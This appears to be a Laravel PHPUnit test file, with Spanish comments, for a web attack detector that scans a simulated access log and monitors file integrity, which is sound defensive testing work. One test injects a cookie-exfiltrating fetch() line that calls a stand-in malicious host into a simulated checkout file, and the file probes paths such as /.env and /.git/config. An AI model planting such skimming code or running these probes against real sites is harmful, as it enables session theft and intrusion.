<?php

namespace Tests\Feature\Security;

use App\Services\Security\Alert;
use App\Services\Security\Detectors\WebAttackDetector;
use App\Services\Security\ScanContext;
use App\Services\Security\Severity;
use App\Services\Security\State\FileStateStore;
use App\Services\Security\Support\AccessLogReader;
use App\Services\Security\Support\AgentConfig;
use App\Services\Security\Support\IntegrityMonitor;
use Carbon\CarbonImmutable;
use Tests\TestCase;

/**
 * Modulo 3 — ciberseguridad. Corre contra un access log simulado que incluye
 * al menos un caso de cada tipo de alerta, mas trafico legitimo y una IP en
 * lista blanca que NO debe alertar.
 *
 * No toca la base de datos ni el servidor real.
 */
class WebAttackDetectorTest extends TestCase
{
    private string $workDir;
    private string $logPath;
    private ?string $watchedFile = null;

    protected function setUp(): void
    {
        parent::setUp();

        $this->workDir = sys_get_temp_dir() . DIRECTORY_SEPARATOR . 'sec-agent-test-' . uniqid();
        mkdir($this->workDir, 0775, true);

        $this->logPath = $this->workDir . DIRECTORY_SEPARATOR . 'access.log';
        file_put_contents($this->logPath, $this->buildLog());
    }

    protected function tearDown(): void
    {
        if ($this->watchedFile && is_file($this->watchedFile)) {
            @unlink($this->watchedFile);
        }

        $this->removeDir($this->workDir);

        parent::tearDown();
    }

    public function test_detecta_un_caso_de_cada_tipo_de_ataque(): void
    {
        $alerts = $this->scan();
        $types  = array_map(fn (Alert $a) => $a->type, $alerts);

        foreach ([
            'sql_injection',
            'xss',
            'path_traversal',
            'command_injection',
            'rutas_sensibles',
            'escaner_conocido',
            'escaneo_4xx',
            'fuerza_bruta_login_web',
            'trafico_excesivo',
        ] as $expected) {
            $this->assertContains($expected, $types, "Falta la deteccion de «{$expected}»");
        }
    }

    public function test_la_inyeccion_sql_respondida_con_200_es_critica(): void
    {
        $alert = $this->firstOfType($this->scan(), 'sql_injection');

        $this->assertSame(Severity::CRITICA, $alert->severity);
        $this->assertTrue($alert->evidence['respondio']);
        $this->assertSame('203.0.113.10', $alert->evidence['ip']);
        $this->assertNotEmpty($alert->recommendation);
    }

    public function test_el_path_traversal_rechazado_es_alta_y_no_critica(): void
    {
        $alert = $this->firstOfType($this->scan(), 'path_traversal');

        $this->assertSame(Severity::ALTA, $alert->severity);
    }

    public function test_la_ip_en_lista_blanca_no_genera_alerta(): void
    {
        foreach ($this->scan() as $alert) {
            $this->assertNotSame('127.0.0.1', $alert->evidence['ip'] ?? null);
        }
    }

    public function test_el_trafico_legitimo_no_genera_alerta(): void
    {
        foreach ($this->scan() as $alert) {
            $this->assertNotSame('190.12.88.4', $alert->evidence['ip'] ?? null);
        }
    }

    public function test_la_lectura_es_incremental(): void
    {
        $state = new FileStateStore($this->workDir . DIRECTORY_SEPARATOR . 'state');

        $first = (new AccessLogReader($state, 'test'))->read($this->logPath);
        $state->flush();

        $this->assertGreaterThan(0, count($first['entries']));

        // Sin lineas nuevas, la segunda lectura no devuelve nada.
        $second = (new AccessLogReader($state, 'test'))->read($this->logPath);
        $this->assertCount(0, $second['entries']);

        // Y al llegar una linea nueva, solo devuelve esa.
        file_put_contents($this->logPath, $this->line('198.51.100.99', 'GET', '/.env', 404, 'curl/8.4.0'), FILE_APPEND);

        $third = (new AccessLogReader($state, 'test'))->read($this->logPath);
        $this->assertCount(1, $third['entries']);
        $this->assertSame('198.51.100.99', $third['entries'][0]['ip']);
    }

    public function test_la_rotacion_del_log_reinicia_el_offset(): void
    {
        $state  = new FileStateStore($this->workDir . DIRECTORY_SEPARATOR . 'state');
        $reader = new AccessLogReader($state, 'test');

        $reader->read($this->logPath);
        $state->flush();

        // logrotate deja el archivo mas pequeno que el offset guardado.
        file_put_contents($this->logPath, $this->line('198.51.100.98', 'GET', '/.git/config', 404, 'curl/8.4.0'));

        $after = (new AccessLogReader($state, 'test'))->read($this->logPath);
        $this->assertCount(1, $after['entries']);
    }

    public function test_avisa_cuando_no_encuentra_el_access_log(): void
    {
        config(['security-agent.web_attacks.access_log_paths' => ['/ruta/que/no/existe.log']]);
        config(['security-agent.web_attacks.integrity.enabled' => false]);

        $alerts = (new WebAttackDetector())->detect($this->context());

        $this->assertSame('access_log_ausente', $alerts[0]->type);
        $this->assertSame(Severity::MEDIA, $alerts[0]->severity);
    }

    public function test_el_cambio_de_un_archivo_de_checkout_es_critico(): void
    {
        // El monitor trabaja con rutas relativas a base_path(), asi que el
        // archivo simulado tiene que vivir dentro del proyecto.
        $relative = 'storage/framework/testing/checkout-simulado.php';
        $watched  = base_path($relative);

        if (!is_dir(dirname($watched))) mkdir(dirname($watched), 0775, true);
        file_put_contents($watched, '<?php // original');
        $this->watchedFile = $watched;

        $state   = new FileStateStore($this->workDir . DIRECTORY_SEPARATOR . 'state');
        $monitor = new IntegrityMonitor($state);

        // Primera corrida: solo aprende la linea base, no alerta.
        $baseline = $monitor->check([$relative]);
        $this->assertTrue($baseline['baseline']);
        $this->assertEmpty($baseline['changed']);

        // Alguien inyecta codigo en el archivo del checkout.
        file_put_contents($watched, '<?php // original' . PHP_EOL . 'fetch("https://malicioso.example/x?c="+document.cookie);');

        $after = $monitor->check([$relative]);

        $this->assertCount(1, $after['changed']);
        $this->assertSame($relative, $after['changed'][0]['file']);
        $this->assertNotSame($after['changed'][0]['sha256_old'], $after['changed'][0]['sha256_new']);
    }

    public function test_la_misma_alerta_no_se_repite_dentro_de_la_ventana(): void
    {
        $state = new FileStateStore($this->workDir . DIRECTORY_SEPARATOR . 'state');
        $now   = CarbonImmutable::now();

        $this->assertFalse($state->isDuplicate('system:web_attacks:sql_injection:203.0.113.10', 24, $now));
        $this->assertTrue($state->isDuplicate('system:web_attacks:sql_injection:203.0.113.10', 24, $now));

        // Pasada la ventana, vuelve a emitirse.
        $this->assertFalse($state->isDuplicate('system:web_attacks:sql_injection:203.0.113.10', 24, $now->addHours(25)));
    }

    // ── Apoyo ─────────────────────────────────────────────────────────────────

    /** @return Alert[] */
    private function scan(): array
    {
        config([
            'security-agent.web_attacks.access_log_paths'  => [$this->logPath],
            'security-agent.web_attacks.whitelist_ips'     => ['127.0.0.1', '::1'],
            'security-agent.web_attacks.integrity.enabled' => false,
        ]);

        return (new WebAttackDetector())->detect($this->context());
    }

    private function context(): ScanContext
    {
        return new ScanContext(
            CarbonImmutable::now(),
            AgentConfig::load($this->workDir . DIRECTORY_SEPARATOR . 'no-existe.json'),
            new FileStateStore($this->workDir . DIRECTORY_SEPARATOR . 'state'),
        );
    }

    /** @param  Alert[]  $alerts */
    private function firstOfType(array $alerts, string $type): Alert
    {
        foreach ($alerts as $alert) {
            if ($alert->type === $type) return $alert;
        }

        $this->fail("No se genero ninguna alerta de tipo «{$type}»");
    }

    private function buildLog(): string
    {
        $template = file_get_contents(base_path('tests/Fixtures/security/access-log-simulado.log'));
        $log      = str_replace('{TS}', CarbonImmutable::now()->format('d/M/Y:H:i:s O'), $template);

        // Escaneo de directorios: 35 respuestas 4xx desde una misma IP.
        for ($i = 0; $i < 35; $i++) {
            $log .= $this->line('198.51.100.50', 'GET', "/admin/panel{$i}", 404, 'Mozilla/5.0');
        }

        // Fuerza bruta contra el login: 25 POST desde una misma IP.
        for ($i = 0; $i < 25; $i++) {
            $log .= $this->line('203.0.113.90', 'POST', '/login', 302, 'Mozilla/5.0');
        }

        // Scraping / DoS: 320 peticiones de una IP dentro del mismo minuto.
        for ($i = 0; $i < 320; $i++) {
            $log .= $this->line('198.51.100.70', 'GET', "/ecommerce/producto/{$i}", 200, 'Go-http-client/2.0');
        }

        return $log;
    }

    private function line(string $ip, string $method, string $path, int $status, string $agent): string
    {
        return sprintf(
            '%s - - [%s] "%s %s HTTP/1.1" %d 512 "-" "%s"' . PHP_EOL,
            $ip,
            CarbonImmutable::now()->format('d/M/Y:H:i:s O'),
            $method,
            $path,
            $status,
            $agent
        );
    }

    private function removeDir(string $dir): void
    {
        foreach ((array) glob($dir . DIRECTORY_SEPARATOR . '*') as $entry) {
            is_dir($entry) ? $this->removeDir($entry) : @unlink($entry);
        }

        @rmdir($dir);
    }
}
